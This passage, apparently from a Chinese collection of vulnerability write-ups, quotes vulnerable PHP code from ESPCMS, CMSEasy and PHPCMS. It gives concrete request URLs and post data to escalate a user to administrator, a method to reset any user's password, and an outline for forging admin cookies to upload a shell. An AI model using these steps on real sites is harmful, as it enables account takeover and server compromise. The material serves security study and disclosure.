$this->fun->accept('esp_powerlist', 'G');
$gettype = false;
} else {
$ecisp_admininfo =
$this->fun->accept('ecisp_admininfo', 'C');
$esp_powerlist =
$this->fun->accept('esp_powerlist', 'C');
$gettype = true;
}
$arr_purview = explode('|',
$this->fun->eccode($ecisp_admininfo, 'DECODE',
db_pscode));
$this->esp_powerlist = explode('|',
$this->fun->eccode($esp_powerlist, 'DECODE',
db_pscode));
list($this->esp_adminuserid,
$this->esp_username, $this->esp_password,
$this->esp_useragent, $this->esp_powerid,
$this->esp_inputclassid, $this->esp_softurl) =
$arr_purview;
if ($gettype) {
if (empty($this->esp_username)
|| empty($this->esp_adminuserid) || md5(admin_AGENT) !=
$this->esp_useragent || md5(admin_ClassURL) !=
$this->esp_softurl) {
$condition = 0;
} else {
$condition = 1;
}
} else {
- 119 -
if (empty($this->esp_username)
|| empty($this->esp_adminuserid) ||
md5(admin_ClassURL) != $this->esp_softurl) {
$condition = 0;
} else {
$condition = 1;
}
}
if ($condition == 0) {
if
($this->fun->accept('archive', 'R') != 'adminuser' &&
$this->fun->accept('action', 'R') != 'login') {
header('location:
index.php?archive=adminuser&action=login');
exit();
}
} else {
if ($condition == 1 &&
$this->fun->accept('point', 'R') == '' &&
$this->fun->accept('archive', 'R') == '' &&
$this->fun->accept('action', 'R') == '') {
header('location:
index.php?archive=management&action=tab&loadfun=mang
ercenter&out=tabcenter');
exit();
}
}
逻辑校验存在问题:
if ($condition == 0) {
if ($this->fun->accept('archive', 'R') != 'adminuser' &&
$this->fun->accept('action', 'R') != 'login') {
header('location: index.php?archive=adminuser&action=login');
- 120 -
exit();
}
当 archive=adminuser,但是 action 变量不等于 login 时就不会被跳
转到登录页。但是在文件 adminsoft\control\adminuser.php 中
function onlogin() {
parent::start_template();
if ($this->fun->accept('logoutid', 'C')
== 1) {
$this->ectemplates->assign('systemTitle',
$this->lng['adminuser_login_lout_error']);
$this->fun->setcookie('logoutid', 0);
} else {
$this->ectemplates->assign('systemTitle',
$this->lng['adminuser_login_login_error']);
}
$this->ectemplates->display('login');
}
function onlogin_into() {
include_once admin_ROOT .
'/public/class_seccode.php';
list($new_seccode, $expiration) =
explode("\t",
$this->fun->eccode($_COOKIE['ecisp_seccode'],
'DECODE'));
$code = new seccode();
$code->seccodeconvert($new_seccode);
parent::start_template();
$db_table = db_prefix . "admin_member";
- 121 -
$linkURL = $_SERVER['HTTP_REFERER'];
还可以调用该类的其他方法，如方法 onlogin_into()
**.**.**.**/adminsoft/index.php?archive=adminuser&acti
on=login_into
也就是可以调用 adminuser.php 这个后台文件的其他功能。
cmseasy 逻辑缺陷可升级普通用户为管理
员
作者：menmen519
user_act.php(130-155):
if (front::post('submit')) {
if (front::post('username') &&
front::post('password')) {
$username = front::post('username');
$password =
md5(front::post('password'));
$data = array(
'username' => $username,
'password' => $password,
);
$user = new user();
$row = $user->getrow(array('username' =>
$data['username'], 'password' => $data['password']));
- 122 -
if (!is_array($row)) {
$this->login_false();
return;
}
$post[$classname] =
session::get('openid');
$this->_user->rec_update($post,
'userid=' . $row['userid']);
cookie::set('login_username',
$row['username']);
cookie::set('login_password',
front::cookie_encode($row['password']));
session::set('username',
$row['username']);
front::redirect(url::create('user'));
return;
} else {
$this->login_false();
return;
}
}
第一步 我们注册一个为 test 密码为 111111 的用户
然后发送 url：
http://localhost/uploads/index.php?case=user&act=respon
d&ologin_code=groupid
postdata:
username=test&password=111111&submit=xxx
第二步：
$post[$classname] = session::get('openid');
- 123 -
这里 我们给$post 传递进去了 groupid 但是有个问题
session::get('openid') 并不存在 所以执行后 test 用户的
groupid 为 0
那么下来我们在继续找一下
line 157-172:
include_once
ROOT.'/lib/plugins/ologin/'.$classname.'.php';
$ologinobj = new $classname();
$status = $ologinobj->respond();
//var_dump(session::get('openid'));exit;
$where[$classname] = session::get('openid');
if(!$where[$classname])
front::redirect(url::create('user'));
$user = new user();
$data = $user->getrow($where);
if(!$data){
$this->view->data = $status;
}else{
cookie::set('login_username',$data['username']);
cookie::set('login_password',front::cookie_encode($d
ata['password']));
session::set('username',$data['username']);
front::redirect(url::create('user'));
}
这里我们看看是不是要写 session 其他的认证信息 我们都忽略 我们
只关心这里的 openid 生效不 可控不
当$classname 为 alipaylogin.php 时候 我们跟进去
function respond() {
ini_set("display_errors","On");
- 124 -
$where =
array('ologin_code'=>front::$get['ologin_code']);
$ologins =
ologin::getInstance()->getrows($where);
$ologin =
unserialize_config($ologins[0]['ologin_config']);
//var_dump($ologin);
$aliapy_config['partner'] =
$ologin['alipaylogin_id'];
$aliapy_config['key'] =
$ologin['alipaylogin_key'];
$aliapy_config['return_url'] =
ologin::url(basename(__FILE__,'.php'));
$aliapy_config['sign_type']
= 'MD5';
$aliapy_config['input_charset']= 'utf-8';
$aliapy_config['transport']
= 'http';
$aliapy_config['cacert']
=
getcwd().'/lib/plugins/alipayauth/cacert.pem';
//var_dump($aliapy_config);
unset($_GET['case']);unset($_GET['act']);unset($_GET
['ologin_code']);unset($_GET['site']);
require_once("alipayauth/alipay_notify.class.php");
$alipayNotify = new
AlipayNotify($aliapy_config);
//var_dump($alipayNotify);
$verify_result = $alipayNotify->verifyReturn();
//var_dump($verify_result);
if(true || $verify_result) {//验证成功
$user_id = front::$get['user_id'];
$token = front::$get['token'];
session::set('access_token',$token);
- 125 -
session::set("openid",$user_id);
return array('nickname'=>
front::get('real_name'));
if(true || $verify_result) {//验证成功 这一行我们让它永远成立 因为
在这之前全是配置信息的东西
我们直接看这里
$user_id = front::$get['user_id'];
$token = front::$get['token'];
session::set('access_token',$token);
session::set("openid",$user_id);
return array('nickname'=>
front::get('real_name'))
发现没有 openid 完全可控制
我们发送 url：
http://localhost/uploads/index.php?case=user&act=respon
d&ologin_code=alipaylogin&user_id=2&real_name=test
这时候我们的 openid 被设置为了 2
那么我们回头在看看
发送 url:
http://localhost/uploads/index.php?case=user&act=respon
d&ologin_code=groupid
postdata:
username=test&password=111111&submit=xxx
这时候 看看 我们的 test 用户组为：
- 126 -
PHPCMS 设计缺陷可重置前台任意用户密
码
作者：loopx9
\phpcms\modules\member\index.php:
/通过用户名找回密码
public function
public_forget_password_username() {
$step = intval($_POST['step']);
$step = max($step,1);
$this->_session_start();
if(isset($_POST['dosubmit']) &&
$step==2) {
//处理提交申请，以手机号为准
if ($_SESSION['code'] !=
strtolower($_POST['code'])) {
showmessage(L('code_error'), HTTP_REFERER);
}
$username =
safe_replace($_POST['username']);
- 127 -
$r =
$this->db->get_one(array('username'=>$username),'use
rid,email');
if($r['email']=='') {
$_SESSION['userid'] =
'';
$_SESSION['code'] = '';
showmessage("该账号没有
绑定手机号码，请选择其他方式找回！");
} else {
$_SESSION['userid'] =
$r['userid'];
$_SESSION['email'] =
$r['email'];
}
$email_arr =
explode('@',$r['email']);
include template('member',
'forget_password_username');
} elseif(isset($_POST['dosubmit']) &&
$step==3) {
$sms_report_db =
pc_base::load_model('sms_report_model');
$mobile_verify =
$_POST['mobile_verify'];
$email = $_SESSION['email'];
if($email){
if(!preg_match('/^([a-z0-9_]+)@([a-z0-9_]+).(
[a-z]{2,6})$/',$email)) exit('check email error');
if($_SESSION['emc_times']=='' ||
$_SESSION['emc_times']db->update($updateinfo,
array('userid'=>$userid));
$rs =
$this->db->get_one(array('userid'=>$userid),'phpssou
id');
if(pc_base::load_config('system', 'phpsso')) {
- 129 -
//初始化
phpsso
$this->_init_phpsso();
$this->client->ps_member_edit('', '', '',
$password, $rs['phpssouid'], $encrypt);
}
$_SESSION['email'] = '';
$_SESSION['userid'] = '';
$_SESSION['emc'] = '';
$_SESSION['code'] = '';
pc_base::load_sys_func('mail');
sendmail($email, '密码重置通知', "您在
".date('Y-m-d H:i:s')."通过密码找回功能，重置了本站密码。");
include
template('member', 'forget_password_username');
exit;
} else {
showmessage("验
证码错误！请重新获取！",HTTP_REFERER,3000);
}
} else {
showmessage("非法请求！
");
}
} else {
- 130 -
include template('member',
'forget_password_username');
}
}
//邮箱获取验证码
public function public_get_email_verify() {
pc_base::load_sys_func('mail');
$this->_session_start();
$code = $_SESSION['emc'] =
random(8,"23456789abcdefghkmnrstwxy");
$_SESSION['emc_times']=5;
$message = '您的验证码为：'.$code;
sendmail($_SESSION['email'], '邮箱找回密
码验证', $message);
echo '1';
}
通过用户名找回密码方式存在设计缺陷。找回密码流程可分作三步来
看:
步骤 1: 客户端提交用户名，服务端在数据库中查询记录，如果存在此
用户就在 session 中保存用户身份信息；
步骤 2: 生成验证码并保存在 session，然后将验证码发往用户注册邮
箱；
步骤 3: 服务端将客户端提交的验证码与 session 中保存的进行比对，
验证通过后重置用户密码。
从代码中可以看到验证码没有绑定用户身份，这样就导致可以使用用
户 A 的验证码来重置用户 B 的密码。
- 131 -
使用用户 A（可控账户）走正常密码找回流程来获取验证码，但不使
用，然后再使用用户 B（要攻击的账户）走步骤 1，接着跳过步骤 2
使用前面获取到的验证码直接走步骤 3，就能重置用户 B 的密码了。
密码相当
Espcms 加密函数缺陷导致 getshell
作者：膜拜 hym
* 程序的加解密函数存在缺陷，可以通过明文和密文逆向还原密钥
* 后台登陆处没有有效验证 cookie 有效性导致攻击者可以通过伪造
cookie 登陆后台
* 后台可以上传 shell
下面一步一步来看
首先是加解密函数 eccode
function eccode($string, $operation = 'DECODE', $key =
'@LFK24s224%@safS3s%1f%', $mcrype = true) {
$result = null;
if ($operation == 'ENCODE') {
for ($i = 0; $i < strlen($string); $i++) {
$char = substr($string, $i, 1);
$keychar = substr($key, ($i % strlen($key)) -
1, 1);
$char = chr(ord($char) + ord($keychar));
- 132 -
$result.=$char;
}
$result = base64_encode($result);
$result = str_replace(array('+', '/', '='),
array('-', '_', ''), $result);
} elseif ($operation == 'DECODE') {
$data = str_replace(array('-', '_'), array('+',
'/'), $string);
$mod4 = strlen($data) % 4;
if ($mod4) {
$data .= substr('====', $mod4);
}
$string = base64_decode($data);
for ($i = 0; $i < strlen($string); $i++) {
$char = substr($string, $i, 1);
$keychar = substr($key, ($i % strlen($key)) -
1, 1);
$char = chr(ord($char) - ord($keychar));
$result.=$char;